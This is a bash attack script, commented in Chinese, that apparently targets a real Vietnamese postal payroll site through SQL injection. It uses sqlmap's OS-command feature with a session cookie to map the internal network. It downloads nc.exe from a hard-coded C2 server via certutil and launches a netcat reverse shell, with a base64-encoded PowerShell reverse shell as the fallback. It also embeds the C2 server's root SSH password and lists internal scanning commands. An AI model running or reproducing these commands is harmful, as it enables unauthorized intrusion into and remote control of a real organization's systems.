#!/bin/bash

SESSION="lswqd4itz5u4ftzm3jcmjfio"
TARGET='http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho%20v%E1%BA%ADn%20mi%E1%BB%81n%20b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC%20Khai%20th%C3%A1c%20TC&MA_TO=VP&TEN_TO=V%C4%83n%20ph%C3%B2ng'
C2_SERVER="82.29.71.156"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 内网渗透：建立隧道"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# [1] 获取目标内网IP配置
echo ""
echo "[1] 获取内网IP配置..."
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd='ipconfig /all' -v 0 2>&1 | grep -A 100 "command standard output" | tee ipconfig_output.txt

echo ""
echo "内网IP提取:"
grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" ipconfig_output.txt | grep -vE "^255\.|^0\.|^127\." | sort -u

# [2] 获取路由表
echo ""
echo "[2] 获取路由表..."
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd='route print' -v 0 2>&1 | grep -A 50 "command standard output" | tee route_output.txt

# [3] 检查网络连通性（能否访问公网）
echo ""
echo "[3] 测试公网连通性..."
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd="ping -n 1 8.8.8.8" -v 0 2>&1 | grep -i "reply\|lost"

# [4] 测试能否连接C2服务器
echo ""
echo "[4] 测试连接C2服务器..."
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd="ping -n 2 $C2_SERVER" -v 0 2>&1 | grep -i "reply\|lost" | tee c2_connectivity.txt

if grep -qi "reply" c2_connectivity.txt; then
    echo "✅ 可以连接C2服务器！"
    
    # [5] 准备反向shell工具（nc.exe）
    echo ""
    echo "[5] 下载反向shell工具..."
    
    # 先在C2上传nc.exe
    sshpass -p '@admin1314@' scp -P 2233 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        /usr/bin/nc root@$C2_SERVER:/root/nc.exe 2>/dev/null || \
        echo "提示: 请在C2服务器上准备nc.exe"
    
    # 下载nc到目标
    python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch \
        --os-cmd="certutil -urlcache -split -f http://$C2_SERVER/nc.exe C:\Windows\Temp\nc.exe" -v 0 2>&1
    
    # [6] 建立反向连接（监听端口8888）
    echo ""
    echo "[6] 启动C2监听器..."
    echo "在另一个终端执行: sshpass -p '@admin1314@' ssh -p 2233 root@$C2_SERVER 'nc -lvp 8888'"
    echo ""
    echo "5秒后发起反向连接..."
    sleep 5
    
    python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch \
        --os-cmd="C:\Windows\Temp\nc.exe -e cmd.exe $C2_SERVER 8888" -v 0 2>&1 &
    
    echo ""
    echo "✅ 反向shell已发起！"
    echo "在C2服务器执行: nc -lvp 8888"
    
else
    echo "❌ 无法连接C2，尝试其他方法..."
    
    # [7] 备选方案：PowerShell反向shell
    echo ""
    echo "[7] 尝试PowerShell反向shell..."
    
    PS_PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("'$C2_SERVER'",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    
    # Base64编码PowerShell命令
    PS_B64=$(echo -n "$PS_PAYLOAD" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
    
    echo "PowerShell Payload已编码"
    echo "在C2执行: nc -lvp 8888"
    echo ""
    sleep 3
    
    python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch \
        --os-cmd="powershell -enc $PS_B64" -v 0 2>&1 &
    
    echo "✅ PowerShell反向shell已发起"
fi

# [8] 内网扫描（如果有反向shell）
echo ""
echo "[8] 准备内网扫描..."
echo "获取到反向shell后，执行:"
echo "  - for /L %i in (1,1,254) do @ping -n 1 -w 100 10.0.1.%i | find \"TTL\""
echo "  - netstat -ano"
echo "  - arp -a"

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 内网隧道建立脚本执行完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
